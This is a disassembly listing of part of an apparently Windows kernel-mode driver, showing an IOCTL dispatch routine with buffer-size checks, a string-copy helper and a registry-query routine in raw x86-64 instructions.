   140002d07:	3d 70 17 00 00       	cmp    $0x1770,%eax
   140002d0c:	0f 82 8f 00 00 00    	jb     0x140002da1
   140002d12:	83 7c 24 44 06       	cmpl   $0x6,0x44(%rsp)
   140002d17:	0f 82 84 00 00 00    	jb     0x140002da1
   140002d1d:	48 8d 94 24 88 01 00 	lea    0x188(%rsp),%rdx
   140002d24:	00 
   140002d25:	48 8d 0d 3c 26 00 00 	lea    0x263c(%rip),%rcx        # 0x140005368
   140002d2c:	e8 ff f1 ff ff       	call   0x140001f30
   140002d31:	48 85 c0             	test   %rax,%rax
   140002d34:	75 36                	jne    0x140002d6c
   140002d36:	48 8d 94 24 88 01 00 	lea    0x188(%rsp),%rdx
   140002d3d:	00 
   140002d3e:	48 8d 0d 33 26 00 00 	lea    0x2633(%rip),%rcx        # 0x140005378
   140002d45:	e8 e6 f1 ff ff       	call   0x140001f30
   140002d4a:	48 85 c0             	test   %rax,%rax
   140002d4d:	75 1d                	jne    0x140002d6c
   140002d4f:	48 8d 94 24 88 01 00 	lea    0x188(%rsp),%rdx
   140002d56:	00 
   140002d57:	48 8d 0d 2a 26 00 00 	lea    0x262a(%rip),%rcx        # 0x140005388
   140002d5e:	e8 cd f1 ff ff       	call   0x140001f30
   140002d63:	48 85 c0             	test   %rax,%rax
   140002d66:	0f 84 50 fe ff ff    	je     0x140002bbc
   140002d6c:	48 8d 15 25 26 00 00 	lea    0x2625(%rip),%rdx        # 0x140005398
   140002d73:	48 8b c8             	mov    %rax,%rcx
   140002d76:	e8 b5 f2 ff ff       	call   0x140002030
   140002d7b:	48 85 c0             	test   %rax,%rax
   140002d7e:	0f 84 38 fe ff ff    	je     0x140002bbc
   140002d84:	48 8d 94 24 90 01 00 	lea    0x190(%rsp),%rdx
   140002d8b:	00 
   140002d8c:	48 8b cf             	mov    %rdi,%rcx
   140002d8f:	ff d0                	call   *%rax
   140002d91:	85 c0                	test   %eax,%eax
   140002d93:	0f 88 23 fe ff ff    	js     0x140002bbc
   140002d99:	48 8b 9c 24 90 01 00 	mov    0x190(%rsp),%rbx
   140002da0:	00 
   140002da1:	48 8b cb             	mov    %rbx,%rcx
   140002da4:	ff 15 be 22 00 00    	call   *0x22be(%rip)        # 0x140005068
   140002daa:	84 c0                	test   %al,%al
   140002dac:	0f 84 0a fe ff ff    	je     0x140002bbc
   140002db2:	48 8b 8c 24 90 01 00 	mov    0x190(%rsp),%rcx
   140002db9:	00 
   140002dba:	66 83 79 58 00       	cmpw   $0x0,0x58(%rcx)
   140002dbf:	0f 84 f7 fd ff ff    	je     0x140002bbc
   140002dc5:	66 83 79 5a 00       	cmpw   $0x0,0x5a(%rcx)
   140002dca:	0f 84 ec fd ff ff    	je     0x140002bbc
   140002dd0:	48 8b 49 60          	mov    0x60(%rcx),%rcx
   140002dd4:	ff 15 8e 22 00 00    	call   *0x228e(%rip)        # 0x140005068
   140002dda:	84 c0                	test   %al,%al
   140002ddc:	0f 84 da fd ff ff    	je     0x140002bbc
   140002de2:	4c 8b 84 24 90 01 00 	mov    0x190(%rsp),%r8
   140002de9:	00 
   140002dea:	48 83 c9 ff          	or     $0xffffffffffffffff,%rcx
   140002dee:	33 c0                	xor    %eax,%eax
   140002df0:	48 8d bd 08 01 00 00 	lea    0x108(%rbp),%rdi
   140002df7:	66 f2 af             	repnz scas (%rdi),%ax
   140002dfa:	41 0f b7 40 5a       	movzwl 0x5a(%r8),%eax
   140002dff:	48 f7 d1             	not    %rcx
   140002e02:	48 03 c9             	add    %rcx,%rcx
   140002e05:	48 3b c8             	cmp    %rax,%rcx
   140002e08:	0f 87 ae fd ff ff    	ja     0x140002bbc
   140002e0e:	4d 8b 40 60          	mov    0x60(%r8),%r8
   140002e12:	48 8d 95 08 01 00 00 	lea    0x108(%rbp),%rdx
   140002e19:	0f 1f 80 00 00 00 00 	nopl   0x0(%rax)
   140002e20:	0f b7 02             	movzwl (%rdx),%eax
   140002e23:	49 83 c0 02          	add    $0x2,%r8
   140002e27:	48 83 c2 02          	add    $0x2,%rdx
   140002e2b:	66 41 89 40 fe       	mov    %ax,-0x2(%r8)
   140002e30:	66 85 c0             	test   %ax,%ax
   140002e33:	75 eb                	jne    0x140002e20
   140002e35:	48 83 c9 ff          	or     $0xffffffffffffffff,%rcx
   140002e39:	33 c0                	xor    %eax,%eax
   140002e3b:	48 8d bd 08 01 00 00 	lea    0x108(%rbp),%rdi
   140002e42:	66 f2 af             	repnz scas (%rdi),%ax
   140002e45:	48 8b 84 24 90 01 00 	mov    0x190(%rsp),%rax
   140002e4c:	00 
   140002e4d:	48 f7 d1             	not    %rcx
   140002e50:	48 ff c9             	dec    %rcx
   140002e53:	66 03 c9             	add    %cx,%cx
   140002e56:	66 89 48 58          	mov    %cx,0x58(%rax)
   140002e5a:	33 c0                	xor    %eax,%eax
   140002e5c:	e9 60 fd ff ff       	jmp    0x140002bc1
   140002e61:	cc                   	int3
   140002e62:	cc                   	int3
   140002e63:	cc                   	int3
   140002e64:	cc                   	int3
   140002e65:	cc                   	int3
   140002e66:	cc                   	int3
   140002e67:	cc                   	int3
   140002e68:	cc                   	int3
   140002e69:	cc                   	int3
   140002e6a:	cc                   	int3
   140002e6b:	cc                   	int3
   140002e6c:	cc                   	int3
   140002e6d:	cc                   	int3
   140002e6e:	cc                   	int3
   140002e6f:	cc                   	int3
   140002e70:	40 53                	rex push %rbx
   140002e72:	48 83 ec 30          	sub    $0x30,%rsp
   140002e76:	48 8b d9             	mov    %rcx,%rbx
   140002e79:	48 8d 15 40 25 00 00 	lea    0x2540(%rip),%rdx        # 0x1400053c0
   140002e80:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
   140002e85:	ff 15 75 21 00 00    	call   *0x2175(%rip)        # 0x140005000
   140002e8b:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
   140002e90:	ff 15 72 22 00 00    	call   *0x2272(%rip)        # 0x140005108
   140002e96:	48 8b 4b 08          	mov    0x8(%rbx),%rcx
   140002e9a:	ff 15 70 22 00 00    	call   *0x2270(%rip)        # 0x140005110
   140002ea0:	4c 8b 05 d1 46 00 00 	mov    0x46d1(%rip),%r8        # 0x140007578
   140002ea7:	48 8b 15 d2 5b 00 00 	mov    0x5bd2(%rip),%rdx        # 0x140008a80
   140002eae:	48 8b cb             	mov    %rbx,%rcx
   140002eb1:	e8 1a 17 00 00       	call   0x1400045d0
   140002eb6:	4c 8b 05 b3 5b 00 00 	mov    0x5bb3(%rip),%r8        # 0x140008a70
   140002ebd:	48 8b 15 c4 5b 00 00 	mov    0x5bc4(%rip),%rdx        # 0x140008a88
   140002ec4:	48 8b cb             	mov    %rbx,%rcx
   140002ec7:	e8 04 17 00 00       	call   0x1400045d0
   140002ecc:	4c 8b 05 a5 5b 00 00 	mov    0x5ba5(%rip),%r8        # 0x140008a78
   140002ed3:	48 8b 15 b6 5b 00 00 	mov    0x5bb6(%rip),%rdx        # 0x140008a90
   140002eda:	48 8b cb             	mov    %rbx,%rcx
   140002edd:	e8 ee 16 00 00       	call   0x1400045d0
   140002ee2:	48 83 c4 30          	add    $0x30,%rsp
   140002ee6:	5b                   	pop    %rbx
   140002ee7:	c3                   	ret
   140002ee8:	cc                   	int3
   140002ee9:	cc                   	int3
   140002eea:	cc                   	int3
   140002eeb:	cc                   	int3
   140002eec:	cc                   	int3
   140002eed:	cc                   	int3
   140002eee:	cc                   	int3
   140002eef:	cc                   	int3
   140002ef0:	48 89 5c 24 18       	mov    %rbx,0x18(%rsp)
   140002ef5:	56                   	push   %rsi
   140002ef6:	48 81 ec 30 03 00 00 	sub    $0x330,%rsp
   140002efd:	48 8b f2             	mov    %rdx,%rsi
   140002f00:	bb 10 00 00 c0       	mov    $0xc0000010,%ebx
   140002f05:	48 85 d2             	test   %rdx,%rdx
   140002f08:	75 13                	jne    0x140002f1d
   140002f0a:	33 c0                	xor    %eax,%eax
   140002f0c:	48 8b 9c 24 50 03 00 	mov    0x350(%rsp),%rbx
   140002f13:	00 
   140002f14:	48 81 c4 30 03 00 00 	add    $0x330,%rsp
   140002f1b:	5e                   	pop    %rsi
   140002f1c:	c3                   	ret
   140002f1d:	48 8b 82 b8 00 00 00 	mov    0xb8(%rdx),%rax
   140002f24:	48 3b 0d 4d 46 00 00 	cmp    0x464d(%rip),%rcx        # 0x140007578
   140002f2b:	0f 84 32 03 00 00    	je     0x140003263
   140002f31:	48 3b 0d 38 5b 00 00 	cmp    0x5b38(%rip),%rcx        # 0x140008a70
   140002f38:	0f 84 25 03 00 00    	je     0x140003263
   140002f3e:	48 3b 0d 33 5b 00 00 	cmp    0x5b33(%rip),%rcx        # 0x140008a78
   140002f45:	0f 84 18 03 00 00    	je     0x140003263
   140002f4b:	48 3b 0d 06 46 00 00 	cmp    0x4606(%rip),%rcx        # 0x140007558
   140002f52:	0f 85 de 02 00 00    	jne    0x140003236
   140002f58:	80 38 0e             	cmpb   $0xe,(%rax)
   140002f5b:	0f 85 d5 02 00 00    	jne    0x140003236
   140002f61:	8b 58 10             	mov    0x10(%rax),%ebx
   140002f64:	48 89 ac 24 40 03 00 	mov    %rbp,0x340(%rsp)
   140002f6b:	00 
   140002f6c:	8b 68 08             	mov    0x8(%rax),%ebp
   140002f6f:	8b 40 18             	mov    0x18(%rax),%eax
   140002f72:	48 89 bc 24 48 03 00 	mov    %rdi,0x348(%rsp)
   140002f79:	00 
   140002f7a:	48 8b 7a 18          	mov    0x18(%rdx),%rdi
   140002f7e:	05 d8 df dd ff       	add    $0xffdddfd8,%eax
   140002f83:	83 f8 20             	cmp    $0x20,%eax
   140002f86:	0f 87 6c 02 00 00    	ja     0x1400031f8
   140002f8c:	48 8d 15 6d d0 ff ff 	lea    -0x2f93(%rip),%rdx        # 0x140000000
   140002f93:	0f b6 84 02 a0 32 00 	movzbl 0x32a0(%rdx,%rax,1),%eax
   140002f9a:	00 
   140002f9b:	8b 8c 82 78 32 00 00 	mov    0x3278(%rdx,%rax,4),%ecx
   140002fa2:	48 03 ca             	add    %rdx,%rcx
   140002fa5:	ff e1                	jmp    *%rcx
   140002fa7:	48 8b cf             	mov    %rdi,%rcx
   140002faa:	ff 15 b8 20 00 00    	call   *0x20b8(%rip)        # 0x140005068
   140002fb0:	84 c0                	test   %al,%al
   140002fb2:	74 13                	je     0x140002fc7
   140002fb4:	83 fb 04             	cmp    $0x4,%ebx
   140002fb7:	75 0e                	jne    0x140002fc7
   140002fb9:	8b 0f                	mov    (%rdi),%ecx
   140002fbb:	e8 f0 f3 ff ff       	call   0x1400023b0
   140002fc0:	8b d8                	mov    %eax,%ebx
   140002fc2:	e9 ce 01 00 00       	jmp    0x140003195
   140002fc7:	bb 0d 00 00 c0       	mov    $0xc000000d,%ebx
   140002fcc:	e9 2c 02 00 00       	jmp    0x1400031fd
   140002fd1:	48 8b cf             	mov    %rdi,%rcx
   140002fd4:	ff 15 8e 20 00 00    	call   *0x208e(%rip)        # 0x140005068
   140002fda:	84 c0                	test   %al,%al
   140002fdc:	74 47                	je     0x140003025
   140002fde:	83 fb 04             	cmp    $0x4,%ebx
   140002fe1:	75 42                	jne    0x140003025
   140002fe3:	81 fd 10 03 00 00    	cmp    $0x310,%ebp
   140002fe9:	75 3a                	jne    0x140003025
   140002feb:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
   140002ff0:	33 d2                	xor    %edx,%edx
   140002ff2:	44 8b c5             	mov    %ebp,%r8d
   140002ff5:	e8 36 1e 00 00       	call   0x140004e30
   140002ffa:	8b 0f                	mov    (%rdi),%ecx
   140002ffc:	48 8d 54 24 20       	lea    0x20(%rsp),%rdx
   140003001:	e8 5a f4 ff ff       	call   0x140002460
   140003006:	8b d8                	mov    %eax,%ebx
   140003008:	85 c0                	test   %eax,%eax
   14000300a:	0f 88 85 01 00 00    	js     0x140003195
   140003010:	48 8d 54 24 20       	lea    0x20(%rsp),%rdx
   140003015:	48 8b cf             	mov    %rdi,%rcx
   140003018:	44 8b c5             	mov    %ebp,%r8d
   14000301b:	e8 c0 1a 00 00       	call   0x140004ae0
   140003020:	e9 70 01 00 00       	jmp    0x140003195
   140003025:	bb 0d 00 00 c0       	mov    $0xc000000d,%ebx
   14000302a:	e9 ce 01 00 00       	jmp    0x1400031fd
   14000302f:	48 8b cf             	mov    %rdi,%rcx
   140003032:	ff 15 30 20 00 00    	call   *0x2030(%rip)        # 0x140005068
   140003038:	84 c0                	test   %al,%al
   14000303a:	74 29                	je     0x140003065
   14000303c:	81 fb 10 03 00 00    	cmp    $0x310,%ebx
   140003042:	75 21                	jne    0x140003065
   140003044:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
   140003049:	48 8b d7             	mov    %rdi,%rdx
   14000304c:	44 8b c3             	mov    %ebx,%r8d
   14000304f:	e8 8c 1a 00 00       	call   0x140004ae0
   140003054:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
   140003059:	e8 d2 f4 ff ff       	call   0x140002530
   14000305e:	8b d8                	mov    %eax,%ebx
   140003060:	e9 30 01 00 00       	jmp    0x140003195
   140003065:	bb 0d 00 00 c0       	mov    $0xc000000d,%ebx
   14000306a:	e9 8e 01 00 00       	jmp    0x1400031fd
   14000306f:	48 8b cf             	mov    %rdi,%rcx
   140003072:	ff 15 f0 1f 00 00    	call   *0x1ff0(%rip)        # 0x140005068
   140003078:	84 c0                	test   %al,%al
   14000307a:	74 47                	je     0x1400030c3
   14000307c:	83 fb 04             	cmp    $0x4,%ebx
   14000307f:	75 42                	jne    0x1400030c3
   140003081:	81 fd 10 03 00 00    	cmp    $0x310,%ebp
   140003087:	75 3a                	jne    0x1400030c3
   140003089:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
   14000308e:	33 d2                	xor    %edx,%edx
   140003090:	44 8b c5             	mov    %ebp,%r8d
   140003093:	e8 98 1d 00 00       	call   0x140004e30
   140003098:	8b 0f                	mov    (%rdi),%ecx
   14000309a:	48 8d 54 24 20       	lea    0x20(%rsp),%rdx
   14000309f:	e8 5c f5 ff ff       	call   0x140002600
   1400030a4:	8b d8                	mov    %eax,%ebx
   1400030a6:	85 c0                	test   %eax,%eax
   1400030a8:	0f 88 e7 00 00 00    	js     0x140003195
   1400030ae:	48 8d 54 24 20       	lea    0x20(%rsp),%rdx
   1400030b3:	48 8b cf             	mov    %rdi,%rcx
   1400030b6:	44 8b c5             	mov    %ebp,%r8d
   1400030b9:	e8 22 1a 00 00       	call   0x140004ae0
   1400030be:	e9 d2 00 00 00       	jmp    0x140003195
   1400030c3:	bb 0d 00 00 c0       	mov    $0xc000000d,%ebx
   1400030c8:	e9 30 01 00 00       	jmp    0x1400031fd
   1400030cd:	48 8b cf             	mov    %rdi,%rcx
   1400030d0:	ff 15 92 1f 00 00    	call   *0x1f92(%rip)        # 0x140005068
   1400030d6:	84 c0                	test   %al,%al
   1400030d8:	74 29                	je     0x140003103
   1400030da:	81 fb 10 03 00 00    	cmp    $0x310,%ebx
   1400030e0:	75 21                	jne    0x140003103
   1400030e2:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
   1400030e7:	48 8b d7             	mov    %rdi,%rdx
   1400030ea:	44 8b c3             	mov    %ebx,%r8d
   1400030ed:	e8 ee 19 00 00       	call   0x140004ae0
   1400030f2:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
   1400030f7:	e8 24 f6 ff ff       	call   0x140002720
   1400030fc:	8b d8                	mov    %eax,%ebx
   1400030fe:	e9 92 00 00 00       	jmp    0x140003195
   140003103:	bb 0d 00 00 c0       	mov    $0xc000000d,%ebx
   140003108:	e9 f0 00 00 00       	jmp    0x1400031fd
   14000310d:	48 8b cf             	mov    %rdi,%rcx
   140003110:	ff 15 52 1f 00 00    	call   *0x1f52(%rip)        # 0x140005068
   140003116:	84 c0                	test   %al,%al
   140003118:	74 40                	je     0x14000315a
   14000311a:	83 fb 04             	cmp    $0x4,%ebx
   14000311d:	75 3b                	jne    0x14000315a
   14000311f:	81 fd 10 03 00 00    	cmp    $0x310,%ebp
   140003125:	75 33                	jne    0x14000315a
   140003127:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
   14000312c:	33 d2                	xor    %edx,%edx
   14000312e:	44 8b c5             	mov    %ebp,%r8d
   140003131:	e8 fa 1c 00 00       	call   0x140004e30
   140003136:	8b 0f                	mov    (%rdi),%ecx
   140003138:	48 8d 54 24 20       	lea    0x20(%rsp),%rdx
   14000313d:	e8 0e f7 ff ff       	call   0x140002850
   140003142:	8b d8                	mov    %eax,%ebx
   140003144:	85 c0                	test   %eax,%eax
   140003146:	78 4d                	js     0x140003195
   140003148:	48 8d 54 24 20       	lea    0x20(%rsp),%rdx
   14000314d:	48 8b cf             	mov    %rdi,%rcx
   140003150:	44 8b c5             	mov    %ebp,%r8d
   140003153:	e8 88 19 00 00       	call   0x140004ae0
   140003158:	eb 3b                	jmp    0x140003195
   14000315a:	bb 0d 00 00 c0       	mov    $0xc000000d,%ebx
   14000315f:	e9 99 00 00 00       	jmp    0x1400031fd
   140003164:	48 8b cf             	mov    %rdi,%rcx
   140003167:	ff 15 fb 1e 00 00    	call   *0x1efb(%rip)        # 0x140005068
   14000316d:	84 c0                	test   %al,%al
   14000316f:	74 2e                	je     0x14000319f
   140003171:	81 fb 10 03 00 00    	cmp    $0x310,%ebx
   140003177:	75 26                	jne    0x14000319f
   140003179:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
   14000317e:	48 8b d7             	mov    %rdi,%rdx
   140003181:	44 8b c3             	mov    %ebx,%r8d
   140003184:	e8 57 19 00 00       	call   0x140004ae0
   140003189:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
   14000318e:	e8 bd f9 ff ff       	call   0x140002b50
   140003193:	8b d8                	mov    %eax,%ebx
   140003195:	85 db                	test   %ebx,%ebx
   140003197:	75 64                	jne    0x1400031fd
   140003199:	48 89 6e 38          	mov    %rbp,0x38(%rsi)
   14000319d:	eb 66                	jmp    0x140003205
   14000319f:	bb 0d 00 00 c0       	mov    $0xc000000d,%ebx
   1400031a4:	eb 57                	jmp    0x1400031fd
   1400031a6:	48 8b cf             	mov    %rdi,%rcx
   1400031a9:	ff 15 b9 1e 00 00    	call   *0x1eb9(%rip)        # 0x140005068
   1400031af:	84 c0                	test   %al,%al
   1400031b1:	74 15                	je     0x1400031c8
   1400031b3:	83 fd 04             	cmp    $0x4,%ebp
   1400031b6:	75 10                	jne    0x1400031c8
   1400031b8:	8b 05 42 2e 00 00    	mov    0x2e42(%rip),%eax        # 0x140006000
   1400031be:	33 db                	xor    %ebx,%ebx
   1400031c0:	89 07                	mov    %eax,(%rdi)
   1400031c2:	48 89 6e 38          	mov    %rbp,0x38(%rsi)
   1400031c6:	eb 3d                	jmp    0x140003205
   1400031c8:	bb 0d 00 00 c0       	mov    $0xc000000d,%ebx
   1400031cd:	eb 2e                	jmp    0x1400031fd
   1400031cf:	48 8b cf             	mov    %rdi,%rcx
   1400031d2:	ff 15 90 1e 00 00    	call   *0x1e90(%rip)        # 0x140005068
   1400031d8:	84 c0                	test   %al,%al
   1400031da:	74 15                	je     0x1400031f1
   1400031dc:	83 fb 04             	cmp    $0x4,%ebx
   1400031df:	75 10                	jne    0x1400031f1
   1400031e1:	8b 07                	mov    (%rdi),%eax
   1400031e3:	33 db                	xor    %ebx,%ebx
   1400031e5:	48 89 6e 38          	mov    %rbp,0x38(%rsi)
   1400031e9:	89 05 11 2e 00 00    	mov    %eax,0x2e11(%rip)        # 0x140006000
   1400031ef:	eb 14                	jmp    0x140003205
   1400031f1:	bb 0d 00 00 c0       	mov    $0xc000000d,%ebx
   1400031f6:	eb 05                	jmp    0x1400031fd
   1400031f8:	bb 0d 00 00 c0       	mov    $0xc000000d,%ebx
   1400031fd:	48 c7 46 38 00 00 00 	movq   $0x0,0x38(%rsi)
   140003204:	00 
   140003205:	33 d2                	xor    %edx,%edx
   140003207:	48 8b ce             	mov    %rsi,%rcx
   14000320a:	89 5e 30             	mov    %ebx,0x30(%rsi)
   14000320d:	ff 15 05 1f 00 00    	call   *0x1f05(%rip)        # 0x140005118
   140003213:	48 8b bc 24 48 03 00 	mov    0x348(%rsp),%rdi
   14000321a:	00 
   14000321b:	48 8b ac 24 40 03 00 	mov    0x340(%rsp),%rbp
   140003222:	00 
   140003223:	8b c3                	mov    %ebx,%eax
   140003225:	48 8b 9c 24 50 03 00 	mov    0x350(%rsp),%rbx
   14000322c:	00 
   14000322d:	48 81 c4 30 03 00 00 	add    $0x330,%rsp
   140003234:	5e                   	pop    %rsi
   140003235:	c3                   	ret
   140003236:	c7 42 30 00 00 00 00 	movl   $0x0,0x30(%rdx)
   14000323d:	48 c7 42 38 00 00 00 	movq   $0x0,0x38(%rdx)
   140003244:	00 
   140003245:	48 8b ce             	mov    %rsi,%rcx
   140003248:	33 d2                	xor    %edx,%edx
   14000324a:	ff 15 c8 1e 00 00    	call   *0x1ec8(%rip)        # 0x140005118
   140003250:	8b c3                	mov    %ebx,%eax
   140003252:	48 8b 9c 24 50 03 00 	mov    0x350(%rsp),%rbx
   140003259:	00 
   14000325a:	48 81 c4 30 03 00 00 	add    $0x330,%rsp
   140003261:	5e                   	pop    %rsi
   140003262:	c3                   	ret
   140003263:	48 8b 9c 24 50 03 00 	mov    0x350(%rsp),%rbx
   14000326a:	00 
   14000326b:	48 81 c4 30 03 00 00 	add    $0x330,%rsp
   140003272:	5e                   	pop    %rsi
   140003273:	e9 38 15 00 00       	jmp    0x1400047b0
   140003278:	a7                   	cmpsl  (%rdi),(%rsi)
   140003279:	2f                   	(bad)
   14000327a:	00 00                	add    %al,(%rax)
   14000327c:	d1 2f                	shrl   $1,(%rdi)
   14000327e:	00 00                	add    %al,(%rax)
   140003280:	2f                   	(bad)
   140003281:	30 00                	xor    %al,(%rax)
   140003283:	00 6f 30             	add    %ch,0x30(%rdi)
   140003286:	00 00                	add    %al,(%rax)
   140003288:	cd 30                	int    $0x30
   14000328a:	00 00                	add    %al,(%rax)
   14000328c:	0d 31 00 00 64       	or     $0x64000031,%eax
   140003291:	31 00                	xor    %eax,(%rax)
   140003293:	00 a6 31 00 00 cf    	add    %ah,-0x30ffffcf(%rsi)
   140003299:	31 00                	xor    %eax,(%rax)
   14000329b:	00 f8                	add    %bh,%al
   14000329d:	31 00                	xor    %eax,(%rax)
   14000329f:	00 00                	add    %al,(%rax)
   1400032a1:	09 09                	or     %ecx,(%rcx)
   1400032a3:	09 01                	or     %eax,(%rcx)
   1400032a5:	09 09                	or     %ecx,(%rcx)
   1400032a7:	09 02                	or     %eax,(%rdx)
   1400032a9:	09 09                	or     %ecx,(%rcx)
   1400032ab:	09 03                	or     %eax,(%rbx)
   1400032ad:	09 09                	or     %ecx,(%rcx)
   1400032af:	09 04 09             	or     %eax,(%rcx,%rcx,1)
   1400032b2:	09 09                	or     %ecx,(%rcx)
   1400032b4:	05 09 09 09 06       	add    $0x6090909,%eax
   1400032b9:	09 09                	or     %ecx,(%rcx)
   1400032bb:	09 07                	or     %eax,(%rdi)
   1400032bd:	09 09                	or     %ecx,(%rcx)
   1400032bf:	09 08                	or     %ecx,(%rax)
   1400032c1:	cc                   	int3
   1400032c2:	cc                   	int3
   1400032c3:	cc                   	int3
   1400032c4:	cc                   	int3
   1400032c5:	cc                   	int3
   1400032c6:	cc                   	int3
   1400032c7:	cc                   	int3
   1400032c8:	cc                   	int3
   1400032c9:	cc                   	int3
   1400032ca:	cc                   	int3
   1400032cb:	cc                   	int3
   1400032cc:	cc                   	int3
   1400032cd:	cc                   	int3
   1400032ce:	cc                   	int3
   1400032cf:	cc                   	int3
   1400032d0:	48 8b c4             	mov    %rsp,%rax
   1400032d3:	53                   	push   %rbx
   1400032d4:	48 81 ec a0 00 00 00 	sub    $0xa0,%rsp
   1400032db:	48 89 68 08          	mov    %rbp,0x8(%rax)
   1400032df:	48 89 70 10          	mov    %rsi,0x10(%rax)
   1400032e3:	48 8d 15 96 21 00 00 	lea    0x2196(%rip),%rdx        # 0x140005480
   1400032ea:	48 8d 48 a8          	lea    -0x58(%rax),%rcx
   1400032ee:	49 8b f1             	mov    %r9,%rsi
   1400032f1:	49 8b e8             	mov    %r8,%rbp
   1400032f4:	48 c7 40 90 ff ff ff 	movq   $0xffffffffffffffff,-0x70(%rax)
   1400032fb:	ff 
   1400032fc:	ff 15 fe 1c 00 00    	call   *0x1cfe(%rip)        # 0x140005000
   140003302:	48 8d 15 27 21 00 00 	lea    0x2127(%rip),%rdx        # 0x140005430
   140003309:	48 8d 4c 24 40       	lea    0x40(%rsp),%rcx
   14000330e:	ff 15 ec 1c 00 00    	call   *0x1cec(%rip)        # 0x140005000
   140003314:	33 c9                	xor    %ecx,%ecx
   140003316:	48 8d 44 24 50       	lea    0x50(%rsp),%rax
   14000331b:	48 89 4c 24 78       	mov    %rcx,0x78(%rsp)
   140003320:	48 89 8c 24 90 00 00 	mov    %rcx,0x90(%rsp)
   140003327:	00 
   140003328:	48 89 8c 24 98 00 00 	mov    %rcx,0x98(%rsp)
   14000332f:	00 
   140003330:	48 8d 4c 24 38       	lea    0x38(%rsp),%rcx
   140003335:	4c 8d 44 24 70       	lea    0x70(%rsp),%r8
   14000333a:	ba 1f 00 02 00       	mov    $0x2001f,%edx
   14000333f:	c7 44 24 70 30 00 00 	movl   $0x30,0x70(%rsp)
   140003346:	00 
   140003347:	c7 84 24 88 00 00 00 	movl   $0x40,0x88(%rsp)
   14000334e:	40 00 00 00 
   140003352:	48 89 84 24 80 00 00 	mov    %rax,0x80(%rsp)
   140003359:	00 
   14000335a:	ff 15 c0 1d 00 00    	call   *0x1dc0(%rip)        # 0x140005120
   140003360:	8b d8                	mov    %eax,%ebx
   140003362:	85 c0                	test   %eax,%eax
   140003364:	0f 88 ad 00 00 00    	js     0x140003417
   14000336a:	48 8b 4c 24 38       	mov    0x38(%rsp),%rcx
   14000336f:	48 8d 44 24 30       	lea    0x30(%rsp),%rax
   140003374:	4c 8d 4c 24 60       	lea    0x60(%rsp),%r9
   140003379:	48 89 44 24 28       	mov    %rax,0x28(%rsp)
   14000337e:	48 8d 54 24 40       	lea    0x40(%rsp),%rdx
   140003383:	41 b8 02 00 00 00    	mov    $0x2,%r8d
   140003389:	c7 44 24 20 10 00 00 	movl   $0x10,0x20(%rsp)
   140003390:	00 
   140003391:	ff 15 91 1d 00 00    	call   *0x1d91(%rip)        # 0x140005128
   140003397:	8b d8                	mov    %eax,%ebx
   140003399:	85 c0                	test   %eax,%eax
   14000339b:	79 0e                	jns    0x1400033ab
   14000339d:	3d 05 00 00 80       	cmp    $0x80000005,%eax
   1400033a2:	74 07                	je     0x1400033ab
   1400033a4:	3d 23 00 00 c0       	cmp    $0xc0000023,%eax
   1400033a9:	75 6c                	jne    0x140003417
   1400033ab:	8b 54 24 30          	mov    0x30(%rsp),%edx
   1400033af:	33 c9                	xor    %ecx,%ecx
   1400033b1:	41 b8 44 52 56 31    	mov    $0x31565244,%r8d
   1400033b7:	48 89 bc 24 c0 00 00 	mov    %rdi,0xc0(%rsp)
   1400033be:	00 
   1400033bf:	ff 15 6b 1d 00 00    	call   *0x1d6b(%rip)        # 0x140005130
   1400033c5:	48 8b f8             	mov    %rax,%rdi
   1400033c8:	48 85 c0             	test   %rax,%rax
   1400033cb:	75 07                	jne    0x1400033d4
   1400033cd:	bb 9a 00 00 c0       	mov    $0xc000009a,%ebx
   1400033d2:	eb 3b                	jmp    0x14000340f
   1400033d4:	48 8b 4c 24 38       	mov    0x38(%rsp),%rcx
   1400033d9:	48 8d 44 24 30       	lea    0x30(%rsp),%rax
   1400033de:	48 8d 54 24 40       	lea    0x40(%rsp),%rdx
   1400033e3:	48 89 44 24 28       	mov    %rax,0x28(%rsp)
   1400033e8:	8b 44 24 30          	mov    0x30(%rsp),%eax
   1400033ec:	4c 8b cf             	mov    %rdi,%r9
   1400033ef:	41 b8 02 00 00 00    	mov    $0x2,%r8d
   1400033f5:	89 44 24 20          	mov    %eax,0x20(%rsp)
   1400033f9:	ff 15 29 1d 00 00    	call   *0x1d29(%rip)        # 0x140005128
   1400033ff:	8b d8                	mov    %eax,%ebx
   140003401:	85 c0                	test   %eax,%eax
   140003403:	78 0a                	js     0x14000340f
   140003405:	8b 44 24 30          	mov    0x30(%rsp),%eax
   140003409:	48 89 7d 00          	mov    %rdi,0x0(%rbp)
   14000340d:	89 06                	mov    %eax,(%rsi)
   14000340f:	48 8b bc 24 c0 00 00 	mov    0xc0(%rsp),%rdi
   140003416:	00 
   140003417:	48 8b 4c 24 38       	mov    0x38(%rsp),%rcx
   14000341c:	48 8b b4 24 b8 00 00 	mov    0xb8(%rsp),%rsi
   140003423:	00 
   140003424:	48 8b ac 24 b0 00 00 	mov    0xb0(%rsp),%rbp
   14000342b:	00 
   14000342c:	48 83 f9 ff          	cmp    $0xffffffffffffffff,%rcx
   140003430:	74 06                	je     0x140003438
   140003432:	ff 15 a0 1c 00 00    	call   *0x1ca0(%rip)        # 0x1400050d8
   140003438:	8b c3                	mov    %ebx,%eax
   14000343a:	48 81 c4 a0 00 00 00 	add    $0xa0,%rsp
   140003441:	5b                   	pop    %rbx
   140003442:	c3                   	ret
   140003443:	cc                   	int3
   140003444:	cc                   	int3
   140003445:	cc                   	int3
   140003446:	cc                   	int3
   140003447:	cc                   	int3
   140003448:	cc                   	int3
   140003449:	cc                   	int3
   14000344a:	cc                   	int3
   14000344b:	cc                   	int3
   14000344c:	cc                   	int3
   14000344d:	cc                   	int3
   14000344e:	cc                   	int3
   14000344f:	cc                   	int3
   140003450:	40 53                	rex push %rbx
   140003452:	56                   	push   %rsi
   140003453:	57                   	push   %rdi
   140003454:	48 81 ec 30 03 00 00 	sub    $0x330,%rsp
